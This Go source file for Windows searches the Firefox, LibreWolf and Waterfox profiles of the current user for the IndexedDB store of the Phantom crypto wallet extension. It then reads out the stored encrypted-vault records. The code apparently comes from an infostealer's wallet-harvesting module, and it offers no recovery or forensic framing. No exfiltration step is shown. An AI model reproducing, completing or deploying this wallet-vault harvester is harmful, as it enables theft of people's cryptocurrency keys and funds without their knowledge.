//go:build windows

package browser

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	_ "modernc.org/sqlite"
)

var FirefoxBrowsers = []BrowserDef{
	{Name: "Firefox", RelPath: filepath.Join("Mozilla", "Firefox", "Profiles")},
	{Name: "LibreWolf", RelPath: filepath.Join("librewolf", "Profiles")},
	{Name: "Waterfox", RelPath: filepath.Join("Waterfox", "Profiles")},
}

type FFVaultInfo struct {
	Browser string
	Profile string
	DBPath  string
}

func FindFirefoxPhantomVaults() []FFVaultInfo {
	appData := os.Getenv("APPDATA")
	if appData == "" { return nil }
	var vaults []FFVaultInfo
	for _, browser := range FirefoxBrowsers {
		profilesDir := filepath.Join(appData, browser.RelPath)
		entries, err := os.ReadDir(profilesDir)
		if err != nil { continue }
		for _, entry := range entries {
			if !entry.IsDir() { continue }
			profilePath := filepath.Join(profilesDir, entry.Name())
			storageDir := filepath.Join(profilePath, "storage", "default")
			mozDirs, err := os.ReadDir(storageDir)
			if err != nil { continue }
			for _, mozDir := range mozDirs {
				if !mozDir.IsDir() { continue }
				if !strings.HasPrefix(mozDir.Name(), "moz-extension") { continue }
				idbDir := filepath.Join(storageDir, mozDir.Name(), "idb")
				idbEntries, err := os.ReadDir(idbDir)
				if err != nil { continue }
				for _, idbEntry := range idbEntries {
					if !strings.HasSuffix(idbEntry.Name(), ".sqlite") { continue }
					dbPath := filepath.Join(idbDir, idbEntry.Name())
					if hasPhantomKeys(dbPath) { vaults = append(vaults, FFVaultInfo{browser.Name, entry.Name(), dbPath}) }
				}
			}
		}
	}
	return vaults
}

func hasPhantomKeys(dbPath string) bool {
	db, err := sql.Open("sqlite", dbPath+"?mode=ro")
	if err != nil { return false }
	defer db.Close()
	var count int
	q := "SELECT COUNT(*) FROM object_data WHERE key LIKE '.phantom-labs.encryption%' LIMIT 1"
	err = db.QueryRow(q).Scan(&count)
	if err != nil { return false }
	return count > 0
}

type FFVaultStore struct { db *sql.DB }

func OpenFFVault(dbPath string) (*FFVaultStore, error) {
	db, err := sql.Open("sqlite", dbPath+"?mode=ro")
	if err != nil { return nil, fmt.Errorf("open sqlite: %w", err) }
	return &FFVaultStore{db: db}, nil
}

func (v *FFVaultStore) Close() { v.db.Close() }

func (v *FFVaultStore) Get(key string) ([]byte, error) {
	var data []byte
	err := v.db.QueryRow("SELECT data FROM object_data WHERE key = ? LIMIT 1", key).Scan(&data)
	return data, err
}

func (v *FFVaultStore) GetPrefix(prefix string) (map[string][]byte, error) {
	likePattern := prefix + "%"
	rows, err := v.db.Query("SELECT key, data FROM object_data WHERE key LIKE ?", likePattern)
	if err != nil { return nil, err }
	defer rows.Close()
	result := make(map[string][]byte)
	for rows.Next() {
		var k string; var d []byte
		if rows.Scan(&k, &d) == nil { result[k] = d }
	}
	return result, nil
}

func (v *FFVaultStore) GetJSON(key string, target interface{}) error {
	data, err := v.Get(key)
	if err != nil { return err }
	if json.Unmarshal(data, target) == nil { return nil }
	var raw string
	if json.Unmarshal(data, &raw) != nil { return fmt.Errorf("bad JSON: %w", err) }
	return json.Unmarshal([]byte(raw), target)
}

func CleanupFFVault(store *FFVaultStore, tempDir string) {
	if store != nil { store.Close() }
	CleanupVault(tempDir)
}
